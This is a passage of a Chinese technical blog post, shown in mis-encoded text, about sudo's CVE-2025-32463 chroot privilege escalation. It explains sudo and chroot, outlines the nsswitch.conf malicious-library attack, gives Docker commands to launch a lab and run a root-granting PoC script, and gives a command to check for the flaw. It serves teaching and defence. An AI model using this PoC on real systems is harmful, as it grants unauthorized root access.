    <title>ä» CVE-2025-32463 è°ˆåŠ chroot çš„å®¹å™¨éš”ç¦»å®‰å…¨æ€§</title>
    <link href="/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/"/>
    <url>/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>2025 å¹´ 6 æœˆï¼Œ<code>sudo</code> è¢«æ›å²è¯—çº§æœ¬åœ°ææƒæ¼æ´ CVE-2025-32463ã€‚æœ¬æ–‡ç”¨ä¸ä»…æä¾›äº†å®¹å™¨åŒ–æ¼æ´å¤ç°ç¯å¢ƒï¼Œå¯ä¸€é”®å¯åŠ¨æ¼æ´ç¯å¢ƒå¹¶è¿è¡Œ PoC è„šæœ¬ç›´å– <code>root</code> æƒé™ï¼›è¿˜èƒ½æ‰‹æŠŠæ‰‹æ•™æ‚¨æ”»é˜²ç»†èŠ‚ï¼Œæé«˜ä¸ªäººæŠ€æœ¯æ°´å¹³å¹¶å­¦ä¹ ä¼ä¸šçº§åˆ«çš„åº”ç”¨é˜²æŠ¤çŸ¥è¯†ã€‚æ­¤å¤–ï¼Œæœ¬æ–‡è¿˜é™„èµ å®¹å™¨åº•å±‚æŠ€æœ¯åŸç†ï¼Œäº†è§£å®¹å™¨æ˜¯å¦‚ä½•é€šè¿‡ <code>--chroot</code> å®ç°æ ¹æ–‡ä»¶ç³»ç»Ÿåˆ‡æ¢çš„ï¼Ÿå…¶éš”ç¦»æ€§å¦‚ä½•ï¼Ÿ</p><p>æœ¬æ–‡æ˜¯ç¬”è€…åœ¨è…¾è®¯äº‘å¼€å‘è€…å…ˆé”‹ï¼ˆç®€ç§° TDPï¼‰çš„ç›´æ’­å†…å®¹ï¼Œå¯å…³æ³¨è§†é¢‘å·ã€è…¾äº‘å…ˆé”‹ã€‘æŸ¥çœ‹ç›´æ’­å›æ”¾ã€‚è¯»å®Œæœ¬æ–‡ï¼Œæ‚¨ä¸ä»…èƒ½å¯¹ CVE-2025-32463 æ¼æ´æœ‰ä¸ªå…¨é¢çš„è®¤çŸ¥ï¼Œè¿˜èƒ½å¯¹å®¹å™¨çš„æ²™ç®±éš”ç¦»æœ‰ä¸ªåˆæ­¥çš„äº†è§£ã€‚</p><p><img src="/image/image_xZJ3pkERK7.png" alt="å›¾ 1ï¼šç›´æ’­å›æ”¾æŸ¥çœ‹é€šé“" title="å›¾ 1ï¼šç›´æ’­å›æ”¾æŸ¥çœ‹é€šé“"></p><h2 id="0x01-èƒŒæ™¯"><a href="#0x01-èƒŒæ™¯" class="headerlink" title="0x01 èƒŒæ™¯"></a>0x01 èƒŒæ™¯</h2><p>åœ¨å¼€å§‹æœ¬æ¬¡åˆ†äº«ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç®€è¦äº†è§£ä¸€äº›æŠ€æœ¯èƒŒæ™¯çŸ¥è¯†ï¼Œä»¥ä¾¿åœ¨åç»­çš„æ¼æ´è§£æå’Œ <code>chroot</code> å®‰å…¨æ€§è¯„ä¼°ä¸­èƒ½å¤Ÿæ›´å¥½åœ°ç†è§£å†…å®¹ï¼š</p><ul><li>ä»€ä¹ˆæ˜¯ <code>sudo</code> ï¼›</li><li>ä»€ä¹ˆæ˜¯ <code>chroot</code> ï¼›</li><li><code>sudo</code> çš„ <code>--chroot</code> å‚æ•°æœ‰ä½•ä½œç”¨ã€‚</li></ul><h3 id="1-1-sudo-ç®€ä»‹"><a href="#1-1-sudo-ç®€ä»‹" class="headerlink" title="1.1 sudo ç®€ä»‹"></a>1.1 sudo ç®€ä»‹</h3><p><code>sudo</code> çš„å…¨ç§°æ˜¯â€œsuperuser doâ€ï¼Œæ„æ€æ˜¯èƒ½å¤Ÿä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚<code>sudo</code> å…è®¸ç”¨æˆ·åœ¨ä¸å…±äº« <code>root</code> å¯†ç çš„æƒ…å†µä¸‹ï¼Œæš‚æ—¶ä»¥ <code>root</code> æƒé™æ‰§è¡Œå‘½ä»¤å¹¶è®°å½•è¿™äº›æ“ä½œä»¥æ–¹ä¾¿é—®è´£ã€‚</p><p>å¦‚å›¾ 2 æ‰€ç¤ºï¼Œ<code>yaney</code> ç”¨æˆ·å¯é€šè¿‡ <code>sudo</code> å‘½ä»¤ï¼Œåœ¨æ‰§è¡Œå‘½ä»¤æ—¶æš‚æ—¶å°†æƒé™æå‡è‡³ <code>root</code>ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹<code>/var/log/auth.log</code> æ–‡ä»¶ï¼Œäº†è§£ <code>sudo</code> æ‰§è¡Œçš„å‘½ä»¤ã€æ—¶é—´å’Œç”¨æˆ·ç­‰ä¿¡æ¯ï¼Œè¿™å¯¹äºæ—¥å¿—å®¡è®¡å’Œæ”»å‡»æº¯æºæ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p><img src="/image/image_oerGcu_F5X.png" alt="å›¾ 2ï¼šsudo çš„ä¸»è¦åŠŸèƒ½æ¼”ç¤º" title="å›¾ 2ï¼š sudo çš„ä¸»è¦åŠŸèƒ½æ¼”ç¤º"></p><h3 id="1-2-chroot-ç®€ä»‹"><a href="#1-2-chroot-ç®€ä»‹" class="headerlink" title="1.2 chroot ç®€ä»‹"></a>1.2 chroot ç®€ä»‹</h3><p><code>chroot</code> ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯æ›´æ”¹å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•ã€‚å½“æ ¹ç›®å½•è¢«æ›´æ”¹åï¼Œå½“å‰è¿›ç¨‹åŠå…¶å­è¿›ç¨‹åªèƒ½è®¿é—®æ¯”æ–°æ ¹ç›®å½•å±‚æ¬¡æ›´ä½çš„æ–‡ä»¶å’Œç›®å½•ã€‚ä¾‹å¦‚ï¼šè‹¥ä¸»æœºä¸Šå­˜åœ¨ä»¥ä¸‹ç›®å½•å’Œæ–‡ä»¶ï¼š</p><ul><li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;file1</li><li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;dir1&#x2F;file2</li></ul><p>å½“æˆ‘ä»¬å°†å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•æŒ‡å‘ <code>/some/directory/on/host</code> æ—¶ï¼Œå½“å‰è¿›ç¨‹çš„æœ€é«˜æ–‡ä»¶å±‚çº§å°±è¢«è®¾ç½®ä¸º <code>/some/directory/on/host</code> ï¼Œè¿™æ ·ä¸€æ¥ï¼Œé™¤äº†ä»¥ä¸‹æ–‡ä»¶å’Œç›®å½•ï¼Œæˆ‘ä»¬å°†æ— æ³•è®¿é—®å…¶å®ƒä»»ä¸€æ–‡ä»¶å±‚çº§ï¼š</p><ul><li>&#x2F;file1</li><li>&#x2F;dir1&#x2F;file2</li></ul><p>æŸ¥çœ‹ <code>chroot</code> æ‰‹å†Œæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ï¼š<code>chroot</code> ä¸ä»…å¯ä»¥æ›´æ”¹æ ¹ç›®å½•ï¼Œè¿˜èƒ½æ‰§è¡Œå‘½ä»¤ã€‚è‹¥æ²¡æœ‰æŒ‡å®šå‘½ä»¤ï¼Œåˆ™é»˜è®¤ä»¥å¯äº¤äº’çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿæ‰€è®¾ç½®çš„ SHELLã€‚</p><p><img src="/image/image_FgzZgRFeRe.png" alt="å›¾ 3ï¼šchroot çš„æ‰‹å†Œ" title="å›¾ 3ï¼š chroot çš„æ‰‹å†Œ"></p><p>å¦‚å›¾ 4 æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ²¡æœ‰ä»»ä½•å†…å®¹çš„æ–°ç›®å½•<code>new_root</code>å¹¶ <code>chroot</code> åˆ°è¯¥ç›®å½•ä¸­æ—¶ï¼Œæ— è®ºæˆ‘ä»¬æ˜¯å¦è¿½åŠ å‘½ä»¤ï¼Œéƒ½ä¼šè¿è¡Œå¤±è´¥ã€‚æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè¿™æ˜¯å› ä¸º <code>new_root</code> ç›®å½•å¹¶æœªåŒ…å«<code>/bin/bash</code> æ–‡ä»¶ï¼Œä¹Ÿæ— æ³•æ‰¾åˆ° <code>ls</code> ç­‰å‘½ä»¤ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å°†æ‰€è¦è¿è¡Œçš„å‘½ä»¤æ–‡ä»¶æ”¾åœ¨ <code>new_root</code> ç›®å½•ä¸­ã€‚</p><p><img src="/image/image_PJ-R6fO4VM.png" alt="å›¾ 4ï¼šchroot çš„ä¸»è¦åŠŸèƒ½æ¼”ç¤º" title="å›¾ 4ï¼š chroot çš„ä¸»è¦åŠŸèƒ½æ¼”ç¤º"></p><p>åœ¨ SFTP&#x2F;FTP çš„ä½¿ç”¨åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬è‹¥æƒ³ç”¨æˆ·åœ¨æ–‡ä»¶ä¼ è¾“æœŸé—´ä»…èƒ½è®¿é—®ä¸»ç›®å½•ï¼Œé€šå¸¸ä½¿ç”¨ <code>chroot</code> å°† FTP è¿›ç¨‹çš„æ ¹ç›®å½•è®¾ç½®ä¸º<code>/home/user</code>ï¼Œä»¥é˜²æ­¢æ¶æ„ç”¨æˆ·è®¿é—®<code>/etc/passwd</code>ç­‰æ•æ„Ÿæ–‡ä»¶ã€‚</p><p>ä½† <code>chroot</code>ä¸éš”ç¦»å†…æ ¸èƒ½åŠ›ã€ä¸æ¸…ç†ç¯å¢ƒå˜é‡ã€ä»¥åŠä¸å±è”½ç³»ç»Ÿè°ƒç”¨æƒé™ï¼Œå¯¼è‡´ç”¨æˆ·ä»ç„¶å¯ä»¥é€šè¿‡å„ç§æ–¹å¼æ‰“ç ´éš”ç¦»ï¼Œæˆ‘ä»¬å°†æœ¬æ–‡çš„ç¬¬ä¸‰éƒ¨åˆ†å¯¹ <code>chroot</code> çš„éš”ç¦»è¿›è¡Œå®‰å…¨è¯„ä¼°ã€‚</p><h3 id="1-3-sudo-çš„-â€“chroot-å‚æ•°"><a href="#1-3-sudo-çš„-â€“chroot-å‚æ•°" class="headerlink" title="1.3 sudo çš„ â€“chroot å‚æ•°"></a>1.3 sudo çš„ â€“chroot å‚æ•°</h3><p>åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œ<code>chroot</code> å‘½ä»¤éœ€è¦ä»¥ <code>root</code> æƒé™æ‰§è¡Œã€‚è‹¥æ™®é€šç”¨æˆ·éœ€è¦ä½¿ç”¨ <code>chroot</code> å‘½ä»¤ï¼Œæˆ‘ä»¬éœ€è¦æˆäºˆå…¶ <code>root</code> æƒé™ï¼Œä½†è¿™ä¸¥é‡è¿åäº†æœ€å°æƒé™åŸåˆ™ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ <code>sudo</code> æ‰§è¡Œ <code>chroot</code> å‘½ä»¤ï¼ˆå³ <code>sudo chroot</code>ï¼‰ï¼Œä½†è¿™ä»ç„¶ç»™äºˆäº†æ™®é€šç”¨æˆ·å®Œæ•´çš„ <code>root</code> æƒé™ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸‹è¿°å‘½ä»¤ <code>chroot</code> åˆ°æŸä¸ªç›®å½•ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> /path/to/dir /bin/bash<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸Š <code>chroot</code>åªæ˜¯å°†å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•æ›´æ”¹ä¸ºæˆ‘ä»¬æ‰€è®¾ç½®çš„è·¯å¾„<code>/path/to/dir</code>ï¼Œç„¶åä»¥ <code>root</code> æƒé™æ‰§è¡Œ <code>/bin/bash</code>ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±åœ¨æ–°çš„æ ¹ç›®å½•ä¸‹ä»¥ <code>root</code> æƒé™æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚å¦‚æœç›®æ ‡ç›®å½•æ˜¯ç”¨æˆ·æ§åˆ¶çš„ï¼Œé£é™©ä¼šæ›´å¤§ã€‚</p><p>2020 å¹´ 9 æœˆ 29 æ—¥ï¼Œ<code>sudo</code>åœ¨ 1.9.3 ç‰ˆæœ¬ä¸­å¼•å…¥äº† <code>--chroot</code> å‚æ•°ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†ç›®æ ‡ç›®å½•é™åˆ¶åœ¨å•ä¸ªç›®å½•ä¸­äº†ï¼Œè¯¦æƒ…è¯·çœ‹ <code>sudo</code> çš„<a href="https://www.sudo.ws/releases/stable/#1.9.3" title="å‘ç‰ˆè®°å½•">å‘ç‰ˆè®°å½•</a>ã€‚</p><p><img src="/image/image_yfvH8U0Gux.png" alt="å›¾ 5ï¼šsudo çš„ --chroot å‚æ•°" title="å›¾5ï¼š sudo çš„ --chroot å‚æ•°"></p><p><code>sudo</code> çš„å†…ç½®çš„ <code>--chroot</code> åŠŸèƒ½é»˜è®¤ä¸å¯ç”¨ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ <code>sudoers</code> æ–‡ä»¶ä¸­æ˜ç¡®å¯ç”¨ã€‚æ­¤å¤–ï¼Œæ— è®º <code>--chroot</code>æ˜¯å¦è¿è¡ŒæˆåŠŸï¼Œ<code>sudo</code> éƒ½ä¼šè¯¦ç»†è®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œè¿™å¯¹äºæ—¥å¿—å®¡è®¡å’Œæ”»å‡»æº¯æºç‰¹åˆ«æœ‰ç”¨ï¼Œè¯¦æƒ…è¯·çœ‹å®˜æ–¹åšå®¢<a href="https://www.sudo.ws/posts/2020/09/using-chroot-and-cwd-in-sudo/" title="ã€ŠUsing chroot and cwd in sudoã€‹">ã€ŠUsing chroot and cwd in sudoã€‹</a>ã€‚</p><p><img src="/image/image_yVJ1S-PQA1.png" alt="å›¾ 6ï¼šsudo --chroot çš„å®˜æ–¹ä½¿ç”¨æ‰‹å†Œ" title="å›¾6ï¼š sudo --chroot çš„å®˜æ–¹ä½¿ç”¨æ‰‹å†Œ"></p><h2 id="0x02-CVE-2025-32463-æ¼æ´è§£æ"><a href="#0x02-CVE-2025-32463-æ¼æ´è§£æ" class="headerlink" title="0x02 CVE-2025-32463 æ¼æ´è§£æ"></a>0x02 CVE-2025-32463 æ¼æ´è§£æ</h2><p>æœ‰äº†ç¬¬ä¸€éƒ¨åˆ†çš„çŸ¥è¯†å›é¡¾ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å¯¹ CVE-2025-32463 æ¼æ´è¿›è¡Œæ·±å…¥è§£æäº†ï¼Œè§£æå†…å®¹åŒ…æ‹¬ï¼š</p><ul><li>å¦‚ä½•å¯¹æ¼æ´çš„å¤§è‡´æƒ…å†µè¿›è¡Œç®€å•åœ°æè¿°ï¼›</li><li>å¦‚ä½•å¿«é€Ÿå¯åŠ¨æ¼æ´ç¯å¢ƒå¹¶è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼›</li><li>å¦‚ä½•å¿«é€ŸéªŒè¯å½“å‰ç¯å¢ƒæ˜¯å¦å—æ¼æ´å½±å“ï¼›</li><li>å¦‚ä½•æ­å»ºæ¼æ´ç¯å¢ƒå¹¶ä¸€æ­¥æ­¥åœ°è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼›</li><li>å¦‚ä½•å¯¹å…¬å¸èµ„äº§è¿›è¡Œå½±å“é¢æ’æŸ¥ï¼›</li><li>å¦‚ä½•å¯¹èµ„äº§çš„ç¯å¢ƒè¿›è¡Œæ’æŸ¥ï¼›</li><li>å¦‚ä½•ä»æºç å±‚é¢åˆ†ææ¼æ´çš„æˆå› ä»¥åŠä¿®å¤æªæ–½ã€‚</li></ul><h3 id="2-1-æ¼æ´æè¿°"><a href="#2-1-æ¼æ´æè¿°" class="headerlink" title="2.1 æ¼æ´æè¿°"></a>2.1 æ¼æ´æè¿°</h3><p>2025 å¹´ 6 æœˆ 30 æ—¥ï¼Œ<a href="https://www.stratascale.com/" title="Stratascale">Stratascale</a> ç½‘ç»œç ”ç©¶éƒ¨é—¨ (CRU) çš„ <a href="https://x.com/0xm1rch" title="Rich Mirch">Rich Mirch</a>åœ¨ <code>sudo</code> ä¸­å‘ç°äº†ä¸¤ä¸ªæƒé™æå‡æ¼æ´ï¼Œå‡å¯å°†ç³»ç»Ÿæƒé™æå‡åˆ° <code>root</code> æƒé™ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host" title="ã€ŠCVE-2025-32462ï¼šsudo çš„ --host æƒé™æå‡æ¼æ´ã€‹">ã€ŠCVE-2025-32462ï¼šsudo çš„ â€“host æƒé™æå‡æ¼æ´ã€‹</a></li><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot" title="ã€ŠCVE-2025-32463ï¼šsudo çš„ --chroot æƒé™æå‡æ¼æ´ã€‹">ã€ŠCVE-2025-32463ï¼šsudo çš„ â€“chroot æƒé™æå‡æ¼æ´ã€‹</a></li></ul><p><code>--host</code> å’Œ <code>--chroot</code> éƒ½æ˜¯ <code>sudo</code> ä¸­ä¸å¸¸ç”¨çš„å‚æ•°ï¼Œè€Œæœ¬æ¬¡åˆ†äº«æˆ‘ä»¬åªè®¨è®ºå…¶ä¸­çš„ CVE-2025-32463 æ¼æ´ï¼Œè¯¥æ¼æ´æ— éœ€å®šä¹‰ä»»ä½• <code>sudo</code> è§„åˆ™ï¼Œå³å¯å°†æ™®é€šç”¨æˆ·çš„æƒé™æå‡è‡³ <code>root</code> æƒé™ï¼Œæˆ‘ä»¬å°†åœ¨æœ¬æ–‡çš„ã€2.2 å¿«é€Ÿå¼€å§‹ã€‘ä¸­è¯´æ˜ï¼Œå¦‚ä½•ä¸€é”®å¯åŠ¨æ¼æ´ç¯å¢ƒï¼Œå¹¶ä½¿ç”¨å…¶ä¸­çš„ PoC è„šæœ¬å¿«é€Ÿææƒã€‚</p><p>æ ¹æ®æœ€åˆçš„å®‰å…¨å…¬å‘Šæ•°æ®ï¼Œå·²æ˜ç¡®å¾—çŸ¥ <code>sudo</code>çš„ 1.9.14 è‡³ 1.9.17 ç‰ˆæœ¬å‡å—å…¶å½±å“ï¼Œä½†å¹¶éæ‰€æœ‰ç‰ˆæœ¬éƒ½ç»è¿‡æµ‹è¯•ã€‚æˆ‘ä»¬å°†åœ¨æœ¬æ–‡çš„ã€2.3 æ¼æ´éªŒè¯ã€‘ä¸­è¯´æ˜ï¼Œå¦‚ä½•å¿«é€ŸéªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬å°†åœ¨æœ¬æ–‡çš„ã€2.4 ç¯å¢ƒæ­å»ºã€‘å’Œã€2.5 æ¼æ´åˆ©ç”¨ã€‘ä¸­å®æ“ä¸€éæ”»å‡»æµç¨‹ï¼š</p><ul><li>æ”»å‡»è€…è‡ªå®šä¹‰<code>/etc/nsswitch.conf</code>é…ç½®æ–‡ä»¶å†…å®¹ï¼Œè¯±å¯¼ <code>sudo</code> åŠ è½½æŒ‡å®šæ ¹ç›®å½•ä¸‹çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼›</li><li>ç„¶åä½¿ç”¨ <code>sudo</code> çš„ <code>--chroot</code> å‚æ•°åˆ‡æ¢åˆ° <code>chroot</code> ç¯å¢ƒï¼Œè‡ªåŠ¨åŠ è½½æ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼Œä»è€Œå®ç°ä»¥ <code>root</code> æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</li></ul><p>è¯¥æ¼æ´å·²åœ¨ 1.9.17p1 ä¸­å¾—åˆ°äº†ä¿®å¤ï¼Œå› æ­¤è¯·å®‰è£…<code>sudo</code> 1.9.17p1 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä¼šåœ¨ã€2.6 å½±å“é¢æ’æŸ¥ã€‘ä¸­è¯¦ç»†è¯´æ˜ï¼Œå¦‚ä½•å¿«é€Ÿå¯¹å„ç§ä¼ä¸šèµ„äº§è¿›è¡Œå½±å“é¢æ’æŸ¥ï¼Œä»¥åŠå¸¸è§çš„è¯¯åŒºæ˜¯ä»€ä¹ˆã€‚</p><p>è‹¥å½±å“é¢æ’æŸ¥æ— æ³•ç”Ÿæ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¯¹å½“å‰ç¯å¢ƒè¿›è¡Œæ’æŸ¥ï¼Œè¯¦æƒ…è¯·çœ‹ã€2.7 ç¯å¢ƒæ’æŸ¥ã€‘ã€‚è‹¥è¿™äº›å†…å®¹å¯¹äºæ‚¨æ¥è¯´å¤ªç®€å•äº†ï¼Œå¹¶ä¸”è¿˜æƒ³å¯¹æ¼æ´è¿›è¡Œæ·±å…¥çš„åˆ†æå’Œç ”ç©¶ï¼Œæˆ‘ä»¬å°†åœ¨ã€2.8 æºç åˆ†æã€‘ä¸­è¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚</p><h3 id="2-2-å¿«é€Ÿå¼€å§‹"><a href="#2-2-å¿«é€Ÿå¼€å§‹" class="headerlink" title="2.2 å¿«é€Ÿå¼€å§‹"></a>2.2 å¿«é€Ÿå¼€å§‹</h3><p>å¦‚å›¾ 7 æ‰€ç¤ºï¼Œä¸ºäº†æ–¹ä¾¿æ‰€æœ‰äººéƒ½å¯ä»¥ä¸€é”®è¿›è¡Œæ¼æ´å¤ç°ï¼Œä¸ç”¨æ‹…å¿ƒç¯å¢ƒçš„é—®é¢˜ã€‚æˆ‘å·²ç»å°†æ¼æ´ç¯å¢ƒå’Œ PoC æ‰“åŒ…æˆå®¹å™¨é•œåƒï¼Œæ–¹ä¾¿å¤§å®¶æ“ä½œã€‚</p><p><img src="/image/image_iGbGssSCye.png" alt="å›¾ 7ï¼šå—æ¼æ´å½±å“çš„å®¹å™¨é•œåƒç¯å¢ƒ" title="å›¾7ï¼šå—æ¼æ´å½±å“çš„å®¹å™¨é•œåƒç¯å¢ƒ"></p><p>é•œåƒå…±æœ‰<code>deb</code> å’Œ <code>source</code> ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå…¶ä¸­ <code>deb</code> ç‰ˆæœ¬çš„ <code>sudo</code> æ˜¯åŸºäº <code>deb</code> åŒ…å®‰è£…çš„ï¼Œ<code>source</code> ç‰ˆæœ¬çš„ <code>sudo</code>æ˜¯åŸºäºæºç è‡ªè¡Œæ„å»ºçš„ã€‚è¿™ä¸¤ä¸ªç‰ˆæœ¬çš„æ¼æ´å¤ç°æ•ˆæœéƒ½ç›¸åŒï¼Œæˆ‘ä»¬éšæ„æ‹‰å–å…¶ä¸­ä¸€ä¸ªå³å¯ã€‚</p><ol><li><p>éšæ„æ‹‰å–å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬çš„é•œåƒåˆ°æœ¬åœ°è¿è¡Œï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:<span class="hljs-built_in">source</span> bash<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:deb bash<br></code></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œå·¥ä½œç›®å½•ä¸‹çš„ PoC è„šæœ¬ã€‚è¯¥è„šæœ¬å¯ä»¥è¿½åŠ ä»»ä½•å‘½ä»¤ï¼Œè‹¥ä¸è¿½åŠ ä»»ä½•å‘½ä»¤ï¼Œåˆ™é»˜è®¤æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„ <code>bash</code> ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./sudo-chwoot.sh <span class="hljs-built_in">id</span><br>./sudo-chwoot.sh <br></code></pre></td></tr></table></figure></li><li><p>ç”±äºæˆ‘ä»¬åœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™æ·»åŠ äº† <code>--rm</code> å‚æ•°ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>exit</code> é€€å‡ºå®¹å™¨ç¯å¢ƒä¸­è¿‡åï¼Œå®¹å™¨ä¼šè‡ªåŠ¨é”€æ¯ã€‚è‹¥è¦åˆ é™¤é•œåƒï¼Œæ‰§è¡Œä¸‹è¿°å‘½ä»¤å³å¯ã€‚</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:source<br></code></pre></td></tr></table></figure><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:deb<br></code></pre></td></tr></table></figure></li></ol><p><img src="/image/image_431f2OMa-_.png" alt="å›¾ 8ï¼šæ¼æ´åˆ©ç”¨æµç¨‹" title="å›¾8ï¼šæ¼æ´åˆ©ç”¨æµç¨‹"></p><p>è‹¥è¦è‡ªè¡Œæ„å»ºé•œåƒï¼Œè¯¦æƒ…è¯·çœ‹æˆ‘åˆšåˆšåˆ›å»ºçš„é¡¹ç›®<a href="https://github.com/y4ney/CVE-2025-32463-lab" title="CVE-2025-32463-lab">CVE-2025-32463-lab</a>çš„ READMEï¼Œè¯¥é•œåƒ fork è‡ª <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot" title="pr0v3rbs&#x2F;CVE-2025-32463_chwoot">pr0v3rbs&#x2F;CVE-2025-32463_chwoot</a> é¡¹ç›®ï¼Œè¿›è¡Œäº†ä¸€å®šåœ°æ”¹é€ ã€‚</p><p><img src="/image/image_IXsDe1VMyI.png" alt="å›¾ 9ï¼šCVE-2025-32463-lab é¡¹ç›®æè¿°" title="å›¾9ï¼šCVE-2025-32463-lab é¡¹ç›®æè¿°"></p><h3 id="2-3-æ¼æ´éªŒè¯"><a href="#2-3-æ¼æ´éªŒè¯" class="headerlink" title="2.3 æ¼æ´éªŒè¯"></a>2.3 æ¼æ´éªŒè¯</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œä¸‹è¿°å‘½ä»¤ï¼Œåˆ‡æ¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ä¸­å¹¶æ‰§è¡Œä¸€ä¸ªä¸å­˜åœ¨çš„å‘½ä»¤ï¼Œæ¥å¿«é€ŸéªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚å¦‚å›¾ 10 æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ <code>sudo -R hacker hacker</code>å‘½ä»¤æ¥åˆ¤æ–­æ¼æ´æ˜¯å¦å­˜åœ¨ï¼š</p><ul><li>è‹¥å½“å‰çš„<code>sudo</code> çš„ç‰ˆæœ¬ä¸ºå—å½±å“ç‰ˆæœ¬ <code>1.9.15p5-3ubuntu5</code>ï¼Œé‚£ä¹ˆå‘½ä»¤æ‰§è¡ŒæŠ¥é”™ï¼›</li><li>è‹¥å½“å‰çš„<code>sudo</code>çš„ç‰ˆæœ¬ä¸ºä¸å—å½±å“ç‰ˆæœ¬<code>1.9.15p5-3ubuntu5.24.04.1</code>ï¼Œé‚£ä¹ˆå‘½ä»¤æ‰§è¡Œè¿‡åï¼Œä¼šè¦æ±‚æˆ‘ä»¬è¾“å…¥ç”¨æˆ·å¯†ç ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R /does/not/exist fakecmd fakecmd<br></code></pre></td></tr></table></figure><p><img src="/image/image_m2E-ZF3QDc.png" alt="å›¾ 10ï¼šæ¼æ´éªŒè¯æµç¨‹" title="å›¾ 10ï¼šæ¼æ´éªŒè¯æµç¨‹"></p><h3 id="2-4-ç¯å¢ƒæ­å»º"><a href="#2-4-ç¯å¢ƒæ­å»º" class="headerlink" title="2.4 ç¯å¢ƒæ­å»º"></a>2.4 